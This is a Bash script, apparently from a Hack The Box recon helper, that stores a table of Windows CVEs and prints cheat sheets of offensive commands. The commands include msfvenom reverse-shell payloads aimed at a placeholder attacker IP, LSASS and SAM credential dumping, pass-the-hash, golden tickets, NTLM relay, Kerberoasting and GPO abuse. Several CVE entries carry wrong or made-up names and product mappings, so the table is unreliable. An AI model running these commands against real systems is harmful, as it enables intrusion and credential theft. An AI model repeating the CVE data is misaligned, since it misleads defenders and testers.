#!/bin/bash
# ============================================================
# cve_windows.sh - CVEs y vulnerabilidades de Windows
# Para HTB Recon Guiado
# ============================================================

declare -gA CVE_WIN_DESCRIPTION
declare -gA CVE_WIN_AFFECTED
declare -gA CVE_WIN_EXPLOIT
declare -gA CVE_WIN_SEVERITY

# ============================================================
# KERNEL / LOCAL PRIVILEGE ESCALATION
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2024-21345]="Windows Kernel LPE"
CVE_WIN_AFFECTED[CVE-2024-21345]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2024-21345]="PoC available"
CVE_WIN_SEVERITY[CVE-2024-21345]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2024-21338]="AppLocker Kernel LPE"
CVE_WIN_AFFECTED[CVE-2024-21338]="Windows 11 23H2"
CVE_WIN_EXPLOIT[CVE-2024-21338]="Lazarus group APT"
CVE_WIN_SEVERITY[CVE-2024-21338]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2023-21768]="Windows WinSock LPE"
CVE_WIN_AFFECTED[CVE-2023-21768]="Windows 11 22H2"
CVE_WIN_EXPLOIT[CVE-2023-21768]="PoC on GitHub"
CVE_WIN_SEVERITY[CVE-2023-21768]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2023-36884]="Office/Windows HTML RCE"
CVE_WIN_AFFECTED[CVE-2023-36884]="Windows 10/11, Server 2019/2022, Office"
CVE_WIN_EXPLOIT[CVE-2023-36884]="ISO/DOCX trigger, Starkloit APT"
CVE_WIN_SEVERITY[CVE-2023-36884]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2022-21999]="Print Spooler LPE"
CVE_WIN_AFFECTED[CVE-2022-21999]="Windows 10/11, Server 2016-2022"
CVE_WIN_EXPLOIT[CVE-2022-21999]="SpoolFool"
CVE_WIN_SEVERITY[CVE-2022-21999]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2021-36934]="HiveNightmare/SeriousSAM"
CVE_WIN_AFFECTED[CVE-2021-36934]="Windows 10 21H1/21H2"
CVE_WIN_EXPLOIT[CVE-2021-36934]="HiveNightmare.exe"
CVE_WIN_SEVERITY[CVE-2021-36934]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2021-1675]="PrintNightmare RCE/LPE"
CVE_WIN_AFFECTED[CVE-2021-1675]="Windows 10, Server 2019"
CVE_WIN_EXPLOIT[CVE-2021-1675]="PrintSpoofer, GodPotato, CubixOS"
CVE_WIN_SEVERITY[CVE-2021-1675]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2021-34527]="PrintNightmare Spooler RCE"
CVE_WIN_AFFECTED[CVE-2021-34527]="Windows 10/11, Server 2016-2022"
CVE_WIN_EXPLOIT[CVE-2021-34527]="Metasploit, PrintNightmare.py"
CVE_WIN_SEVERITY[CVE-2021-34527]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2019-1458]="Win32k Elevation of Privilege"
CVE_WIN_AFFECTED[CVE-2019-1458]="Windows 7/10, Server 2008/2016"
CVE_WIN_EXPLOIT[CVE-2019-1458]="WizardOpium APT exploit"
CVE_WIN_SEVERITY[CVE-2019-1458]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2019-0841]="AppXSVC Hard Link LPE"
CVE_WIN_AFFECTED[CVE-2019-0841]="Windows 10, Server 2016-2019"
CVE_WIN_EXPLOIT[CVE-2019-0841]="GitLab PoC"
CVE_WIN_SEVERITY[CVE-2019-0841]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2018-8120]="Win32k LPE"
CVE_WIN_AFFECTED[CVE-2018-8120]="Windows 7/8.1, Server 2008-2012"
CVE_WIN_EXPLOIT[CVE-2018-8120]="Metasploit ms18_8120"
CVE_WIN_SEVERITY[CVE-2018-8120]="HIGH"

# ============================================================
# KERNEL LPE 2023-2025
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2024-30088]="Windows Kernel EoP (NatTraverse)"
CVE_WIN_AFFECTED[CVE-2024-30088]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2024-30088]="Exploited in wild"
CVE_WIN_SEVERITY[CVE-2024-30088]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2023-28252]="CLFS Driver LPE"
CVE_WIN_AFFECTED[CVE-2023-28252]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2023-28252]="Nokoyawa ransomware exploit"
CVE_WIN_SEVERITY[CVE-2023-28252]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2023-21674]="ALPC EoP"
CVE_WIN_AFFECTED[CVE-2023-21674]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2023-21674]="Advanced Local Procedure Call exploit"
CVE_WIN_SEVERITY[CVE-2023-21674]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2022-24483]="Winlogon LPE (PetitPotato)"
CVE_WIN_AFFECTED[CVE-2022-24483]="Windows 10/11, Server 2016-2022"
CVE_WIN_EXPLOIT[CVE-2022-24483]="Winlogon security feature bypass"
CVE_WIN_SEVERITY[CVE-2022-24483]="HIGH"

# ============================================================
# SERVICE EXPLOITS
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2020-0796]="SMBGhost LPE/RCE"
CVE_WIN_AFFECTED[CVE-2020-0796]="Windows 10 1903/1909, Server 1903"
CVE_WIN_EXPLOIT[CVE-2020-0796]="SMBGhost scanner + exploit"
CVE_WIN_SEVERITY[CVE-2020-0796]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2017-0144]="EternalBlue (MS17-010)"
CVE_WIN_AFFECTED[CVE-2017-0144]="Windows 7/8.1, Server 2008/2012"
CVE_WIN_EXPLOIT[CVE-2017-0144]="Metasploit eternalblue_doublepulsar"
CVE_WIN_SEVERITY[CVE-2017-0144]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2017-0145]="EternalRomance (MS17-010)"
CVE_WIN_AFFECTED[CVE-2017-0145]="Windows 7/8.1, Server 2008/2012"
CVE_WIN_EXPLOIT[CVE-2017-0145]="Metasploit eternalromance"
CVE_WIN_SEVERITY[CVE-2017-0145]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2008-4250]="MS08-067 NetAPI Conficker"
CVE_WIN_AFFECTED[CVE-2008-4250]="Windows XP/2003"
CVE_WIN_EXPLOIT[CVE-2008-4250]="Metasploit ms08_067_netapi"
CVE_WIN_SEVERITY[CVE-2008-4250]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2017-7269]="IIS 6.0 WebDAV Buffer Overflow"
CVE_WIN_AFFECTED[CVE-2017-7269]="IIS 6.0"
CVE_WIN_EXPLOIT[CVE-2017-7269]="Metasploit iis_webdav_scstoragepathfromurl"
CVE_WIN_SEVERITY[CVE-2017-7269]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2021-31166]="HTTP.sys RCE"
CVE_WIN_AFFECTED[CVE-2021-31166]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2021-31166]="PoC available"
CVE_WIN_SEVERITY[CVE-2021-31166]="CRITICAL"

# ============================================================
# RDP
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2019-0708]="BlueKeep RDP RCE"
CVE_WIN_AFFECTED[CVE-2019-0708]="Windows 7, Server 2008"
CVE_WIN_EXPLOIT[CVE-2019-0708]="Metasploit rdp_bluekeep"
CVE_WIN_SEVERITY[CVE-2019-0708]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2019-1181]="DejaBlue RDP RCE"
CVE_WIN_AFFECTED[CVE-2019-1181]="Windows 10, Server 2012-2019"
CVE_WIN_EXPLOIT[CVE-2019-1181]="Metasploit rdp_dejablue"
CVE_WIN_SEVERITY[CVE-2019-1181]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2019-1182]="DejaBlue RCE (non-Preauth)"
CVE_WIN_AFFECTED[CVE-2019-1182]="Windows 10, Server 2012-2019"
CVE_WIN_EXPLOIT[CVE-2019-1182]="Metasploit"
CVE_WIN_SEVERITY[CVE-2019-1182]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2012-0002]="MS12-020 RDP DoS"
CVE_WIN_AFFECTED[CVE-2012-0002]="Windows XP/Vista/7/2003/2008"
CVE_WIN_EXPLOIT[CVE-2012-0002]="Metasploit ms12_020"
CVE_WIN_SEVERITY[CVE-2012-0002]="MEDIUM"

# ============================================================
# ACTIVE DIRECTORY
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2020-1472]="Zerologon Netlogon"
CVE_WIN_AFFECTED[CVE-2020-1472]="Windows Server 2008-2019"
CVE_WIN_EXPLOIT[CVE-2020-1472]="Zerologon-Test-POC, impacket"
CVE_WIN_SEVERITY[CVE-2020-1472]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2021-42278]="sAMAccountName Spoofing"
CVE_WIN_AFFECTED[CVE-2021-42278]="Windows Server 2008-2022"
CVE_WIN_EXPLOIT[CVE-2021-42278]="noPac / SamAccountName"
CVE_WIN_SEVERITY[CVE-2021-42278]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2021-42287]="AD CS Kerberos Elevation"
CVE_WIN_AFFECTED[CVE-2021-42287]="Windows Server 2008-2022"
CVE_WIN_EXPLOIT[CVE-2021-42287]="noPac combo with CVE-2021-42278"
CVE_WIN_SEVERITY[CVE-2021-42287]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2022-26923]="AD CS Certifried LPE"
CVE_WIN_AFFECTED[CVE-2022-26923]="Windows Server 2008-2022"
CVE_WIN_EXPLOIT[CVE-2022-26923]="CertifiedPotato, Certify"
CVE_WIN_SEVERITY[CVE-2022-26923]="HIGH"

# ============================================================
# WINRM
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2024-21413]="WinRM Outlook Moniker RCE"
CVE_WIN_AFFECTED[CVE-2024-21413]="Windows 11, Server 2022"
CVE_WIN_EXPLOIT[CVE-2024-21413]="Moniker link to file:// UNC"
CVE_WIN_SEVERITY[CVE-2024-21413]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2023-21529]="WinRM RCE via GDI+"
CVE_WIN_AFFECTED[CVE-2023-21529]="Windows Server 2008-2022"
CVE_WIN_EXPLOIT[CVE-2023-21529]="GDI+ object handling RCE"
CVE_WIN_SEVERITY[CVE-2023-21529]="CRITICAL"

# ============================================================
# EXCHANGE SERVER
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2021-34473]="Exchange ProxyShell"
CVE_WIN_AFFECTED[CVE-2021-34473]="Exchange 2013/2016/2019"
CVE_WIN_EXPLOIT[CVE-2021-34473]="ProxyShell pre-auth RCE chain"
CVE_WIN_SEVERITY[CVE-2021-34473]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2022-41040]="Exchange ProxyNotShell SSRF"
CVE_WIN_AFFECTED[CVE-2022-41040]="Exchange 2013/2016/2019"
CVE_WIN_EXPLOIT[CVE-2022-41040]="AutoDiscover SSRF"
CVE_WIN_SEVERITY[CVE-2022-41040]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2022-41082]="Exchange ProxyNotShell RCE"
CVE_WIN_AFFECTED[CVE-2022-41082]="Exchange 2013/2016/2019"
CVE_WIN_EXPLOIT[CVE-2022-41082]="PowerShell deserialization RCE"
CVE_WIN_SEVERITY[CVE-2022-41082]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2024-26198]="Exchange Server RCE via EWS"
CVE_WIN_AFFECTED[CVE-2024-26198]="Exchange 2016/2019"
CVE_WIN_EXPLOIT[CVE-2024-26198]="EWS deserialization"
CVE_WIN_SEVERITY[CVE-2024-26198]="CRITICAL"

# ============================================================
# MICROSOFT OFFICE / OUTLOOK
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2022-30190]="Follina (MSDT RCE)"
CVE_WIN_AFFECTED[CVE-2022-30190]="Windows / Office all versions"
CVE_WIN_EXPLOIT[CVE-2022-30190]="ms-msdt:/ Protocol, malicious .docx"
CVE_WIN_SEVERITY[CVE-2022-30190]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2023-23397]="Outlook NTLM Relay (Calendar)"
CVE_WIN_AFFECTED[CVE-2023-23397]="Outlook 2013/2016/2019/365"
CVE_WIN_EXPLOIT[CVE-2023-23397]="Calendar invite with UNC path"
CVE_WIN_SEVERITY[CVE-2023-23397]="CRITICAL"

# ============================================================
# SHAREPOINT
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2023-29357]="SharePoint Privilege Escalation"
CVE_WIN_AFFECTED[CVE-2023-29357]="SharePoint Server 2016/2019"
CVE_WIN_EXPLOIT[CVE-2023-29357]="Spoofed JWT token"
CVE_WIN_SEVERITY[CVE-2023-29357]="CRITICAL"

CVE_WIN_DESCRIPTION[CVE-2023-24950]="SharePoint Server RCE"
CVE_WIN_AFFECTED[CVE-2023-24950]="SharePoint Server Subscription Edition"
CVE_WIN_EXPLOIT[CVE-2023-24950]="Deserialization via API"
CVE_WIN_SEVERITY[CVE-2023-24950]="CRITICAL"

# ============================================================
# CREDENTIAL ACCESS
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2022-30211]="LSASS Elevation of Privilege"
CVE_WIN_AFFECTED[CVE-2022-30211]="Windows 10/11"
CVE_WIN_EXPLOIT[CVE-2022-30211]="Mimikatz lsass dump"
CVE_WIN_SEVERITY[CVE-2022-30211]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2022-21893]="RDP Named Pipe Hijacking"
CVE_WIN_AFFECTED[CVE-2022-21893]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2022-21893]="PipePotato"
CVE_WIN_SEVERITY[CVE-2022-21893]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2021-1732]="Win32k LPE (Baddy APT)"
CVE_WIN_AFFECTED[CVE-2021-1732]="Windows 10 1909, Server 2019"
CVE_WIN_EXPLOIT[CVE-2021-1732]="GitLab PoC"
CVE_WIN_SEVERITY[CVE-2021-1732]="HIGH"

# ============================================================
# POTATO ATTACKS
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2021-34484]="User Profile Service LPE"
CVE_WIN_AFFECTED[CVE-2021-34484]="Windows 10, Server 2016-2019"
CVE_WIN_EXPLOIT[CVE-2021-34484]="User Profile Potato"
CVE_WIN_SEVERITY[CVE-2021-34484]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2020-0787]="BITS LPE"
CVE_WIN_AFFECTED[CVE-2020-0787]="Windows 10, Server 2016-2019"
CVE_WIN_EXPLOIT[CVE-2020-0787]="BITSArbitraryFileMove"
CVE_WIN_SEVERITY[CVE-2020-0787]="HIGH"

# ============================================================
# KERNEL LPE 2024-2025
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2024-26169]="Windows Error Reporting LPE"
CVE_WIN_AFFECTED[CVE-2024-26169]="Windows 10/11, Server 2019/2022"
CVE_WIN_EXPLOIT[CVE-2024-26169]="Exploited in wild (Lazarus)"
CVE_WIN_SEVERITY[CVE-2024-26169]="HIGH"

CVE_WIN_DESCRIPTION[CVE-2024-21378]="Outlook RCE (MonikerLink)"
CVE_WIN_AFFECTED[CVE-2024-21378]="Outlook 2013/2016/2019/365"
CVE_WIN_EXPLOIT[CVE-2024-21378]="Malicious form RCE"
CVE_WIN_SEVERITY[CVE-2024-21378]="HIGH"

# ============================================================
# PRINT SPOOLER RECENT
# ============================================================

# ============================================================
# EXCHANGE / SHAREPOINT RECENT
# ============================================================

CVE_WIN_DESCRIPTION[CVE-2024-21410]="Exchange Server NTLM Relay"
CVE_WIN_AFFECTED[CVE-2024-21410]="Exchange 2013/2016/2019"
CVE_WIN_EXPLOIT[CVE-2024-21410]="NTLM relay to Exchange"
CVE_WIN_SEVERITY[CVE-2024-21410]="CRITICAL"

# ============================================================
# WINRM / AUTH
# ============================================================

# ============================================================
# OFFICE / OUTLOOK RECENT
# ============================================================

# ============================================================
# SMB / NETWORK
# ============================================================

# ============================================================
# POTATO ATTACKS RECENT
# ============================================================

# ============================================================
# MSHTML / BROWSER
# ============================================================

# ============================================================
# FUNCTIONS
# ============================================================

windows_cve_terms() {
    local svc="$1" prod="$2" ver="$3"
    local sl=$(to_lower "$svc")
    local pl=$(to_lower "$prod")
    local terms="$sl $pl $ver"

    case "$sl" in
        http|https)
            terms="$terms iis httpd apache nginx"
            ;;
        smb|microsoft-ds|netbios-ssn)
            terms="$terms smb samba"
            ;;
        rdp|ms-wbt-server)
            terms="$terms rdp"
            ;;
        mssql|ms-sql-s|ms-sql-m)
            terms="$terms mssql sql sqlsrv"
            ;;
        ldap|389|kerberos-sec|kpasswd5|msrpc|ncacn_http|domain)
            terms="$terms ldap kerberos active directory netlogon samaccountname domain"
            ;;
        smtp)
            terms="$terms smtp exchange"
            ;;
        pop3|imap)
            terms="$terms outlook exchange"
            ;;
        winrm|5985|5986)
            terms="$terms winrm"
            ;;
        *)
            ;;
    esac
    echo "$terms"
}

get_windows_cve_info() {
    local service="$1"
    local product="${2:-}"
    local version="${3:-}"
    local result=""
    local count=0

    local terms=$(windows_cve_terms "$service" "$product" "$version")
    terms=$(echo "$terms" | tr ' ' '\n' | grep -v '^$' | sort -u | tr '\n' ' ')
    local pattern=$(build_cve_pattern "$terms")

    for cve in "${!CVE_WIN_DESCRIPTION[@]}"; do
        if [ -n "$pattern" ] && echo "${CVE_WIN_AFFECTED[$cve]}" | grep -qiE "$pattern"; then
            result="${result}  ${R}$cve${W} | ${CVE_WIN_DESCRIPTION[$cve]} | [${CVE_WIN_SEVERITY[$cve]}]\n"
            result="${result}    Exploit: ${CVE_WIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done

    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs especificos para este servicio."
    else
        echo -e "$result"
    fi
}

get_windows_privesc_vectors() {
    cat << 'EOF'
  [WINDOWS - VECTORES DE ESCALADA]
  
  1. TOKEN IMPERSONATION (SeImpersonatePrivilege):
     # PrintSpoofer (Windows 10/Server 2016-2019)
     PrintSpoofer.exe -c "cmd /c whoami"
     PrintSpoofer.exe -i -c "cmd.exe"
     
     # GodPotato (Windows 8-11)
     GodPotato.exe -cmd "cmd /c whoami"
     
     # JuicyPotato (Windows 7-10, Server 2008-2016)
     JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}
     
     # Potato (any Windows)
     HotPotato.exe -ip YOUR_IP -cmd "cmd /c whoami"
  
  2. UNQUOTED SERVICE PATH:
     wmic service get name,displayname,pathname,startmode
     | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v '"'
     # Si path sin comas: C:\Program Files\My Service\service.exe
     #     -> C:\Program.exe (ejecuta tu binario)
  
  3. MODIFIABLE SERVICE:
     sc.exe qc <service_name>
     sc.exe config <service_name> binPath= "C:\temp\reverse.exe"
     net stop <service_name> && net start <service_name>
  
  4. ALWAYSINSTALLELEVATED:
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     # Si ambos son 1:
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o reverse.msi
     msiexec /quiet /qn /i reverse.msi
  
  5. DLL HIJACKING:
     # Buscar DLLs faltantes en PATH:
     findstr /si "dll" C:\ProgramData\*.log
     # Crear DLL malicioso con msfvenom:
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o hijack.dll
  
  6. KERNEL EXPLOITS:
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
     # versiones vulnerables:
     # - MS16-032 (Secondary Logon) -> any Windows
     # - MS16-075 (Hot Potato) -> Windows 7-10, Server 2008-2016
     # - CVE-2021-36934 (HiveNightmare) -> Windows 10 21H1
     # - CVE-2021-1675 (PrintNightmare) -> Windows 10, Server 2016-2019
     # - CVE-2020-0796 (SMBGhost) -> Windows 10 1903/1909
  
  7. CREDENTIAL DUMPING:
     # Mimikatz (admin):
     mimikatz # privilege::debug
     mimikatz # sekurlsa::logonpasswords
     
     # Procdump (sin admin):
     procdump.exe -accepteula -ma lsass.exe lsass.dmp
     
     # comsvcs.dll:
     rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full
     
     # SAM Dump:
     reg save HKLM\SAM C:\temp\SAM
     reg save HKLM\SYSTEM C:\temp\SYSTEM
     reg save HKLM\SECURITY C:\temp\SECURITY
  
  8. LATERAL MOVEMENT:
     # Pass-the-Hash:
     psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH domain/user@TARGET
     
     # Pass-the-Ticket:
     ticketConverter.py ticket.kirbi ticket.cc
     export KRB5CCNAME=ticket.cc
     
     # WinRM:
     evil-winrm -i TARGET -u user -p pass -H HASH
     
     # DCOM:
     dcomexec.py domain/user:pass@TARGET "whoami"
EOF
}

get_windows_lateral_movement() {
    cat << 'EOF'
  [WINDOWS - MOVIMIENTO LATERAL]
  
  1. SMB RELAY:
     # Requiere SMB signing deshabilitado
     ntlmrelayx.py -tf targets.txt -smb2support
     # Usar con Responder:
     responder -I eth0 -wF
  
  2. KERBEROASTING:
     impacket-GetUserSPNs.py domain/user:pass -request -outputfile tgs.txt
     hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
  
  3. ASREPROAST:
     impacket-GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt
     hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
  
  4. OVERPASS-THE-HASH:
     getTGT.py domain/user:pass -dc-ip DC_IP
     export KRB5CCNAME=user.ccache
     psexec.py -k -no-pass domain/user@TARGET
  
  5. GOLDEN TICKET:
     # Requiere krbtgt hash:
     mimikatz # kerberos::golden /user:Administrator /domain:domain /sid:S-1-5-21-... /krbtgt:HASH /ptt
  
  6. SILVER TICKET:
     # Requiere service hash:
     mimikatz # kerberos::golden /user:Administrator /domain:domain /sid:S-1-5-21-... /target:TARGET /service:cifs /rc4:HASH /ptt
  
  7. UNCONSTRAINED DELEGATION:
     # Si el server tiene delegation, capturar TGTs:
     Rubeus.exe monitor /interval:5 /nowrap
  
  8. CONSTRAINED DELEGATION:
     # Usar S4U2Self/S4U2Proxy:
     getST.py -spn cifs/target.domain -impersonate administrator domain/user:pass
EOF
}

get_windows_ad_attack() {
    cat << 'EOF'
  [WINDOWS - ACTIVE DIRECTORY ATTACKS]
  
  1. BLOODHOUND:
     bloodhound-python -d domain.htb -u user -p pass -c All -ns TARGET
     # Buscar: Kerberoastable, ASREPRoastable, shortest path to Domain Admin
  
  2. CERTIFICATE SERVICES (AD CS):
     Certify.exe find /vulnerable
     certipy find -u user@domain -p pass -dc-ip TARGET -vulnerable
     # Templates vulnerables: ESC1, ESC2, ESC3, ESC4, ESC7, ESC8
  
  3. CERTIFIED / NO-PAC:
     # CVE-2021-42278 + CVE-2021-42287:
     noPac.py -dc-ip DC_IP domain/user:pass -use-ldaps -impersonate administrator
  
  4. POWERSHELL REMOTING:
     Enter-PSSession -ComputerName TARGET -Credential $cred
     Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
  
  5. DCOM EXECUTION:
     dcomexec.py domain/user:pass@TARGET "whoami"
      # MMC20.Application, ShellWindows, ShellBrowserWindow
   
   6. WMI EXECUTION:
      wmiexec.py domain/user:pass@TARGET "whoami"
      crackmapexec wmi TARGET -u user -p pass -x "whoami"
   
   7. LDAP REBIND:
      # Si tienes write access a computer object:
      # Cambiar SPN para capturar hash:
      python3 targetedKerberoast.py -u user -p pass -d domain -dc DC_IP
   
   8. GPO ABUSE:
      # Si tienes GPO write:
      SharpGPOAbuse.exe --AddComputerTask --TaskName "pwned" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c reverse.exe" --GPOName "VulnerableGPO"
EOF
}

get_windows_cve_by_severity() {
    local severity="$1"
    local result=""
    local count=0
    
    for cve in "${!CVE_WIN_DESCRIPTION[@]}"; do
        if [ "${CVE_WIN_SEVERITY[$cve]}" = "$severity" ]; then
            result="${result}  ${R}$cve${W} | ${CVE_WIN_DESCRIPTION[$cve]}\n"
            result="${result}    Afecta: ${CVE_WIN_AFFECTED[$cve]}\n"
            result="${result}    Exploit: ${CVE_WIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done
    
    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs con severidad $severity."
    else
        echo -e "$result"
    fi
}

get_windows_cve_by_product() {
    local product="$1"
    local result=""
    local count=0
    
    for cve in "${!CVE_WIN_DESCRIPTION[@]}"; do
        if echo "${CVE_WIN_DESCRIPTION[$cve]} ${CVE_WIN_AFFECTED[$cve]}" | grep -qi "$product"; then
            result="${result}  ${R}$cve${W} | ${CVE_WIN_DESCRIPTION[$cve]} | [${CVE_WIN_SEVERITY[$cve]}]\n"
            result="${result}    Afecta: ${CVE_WIN_AFFECTED[$cve]}\n"
            result="${result}    Exploit: ${CVE_WIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done
    
    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs para el producto: $product"
    else
        echo -e "$result"
    fi
}
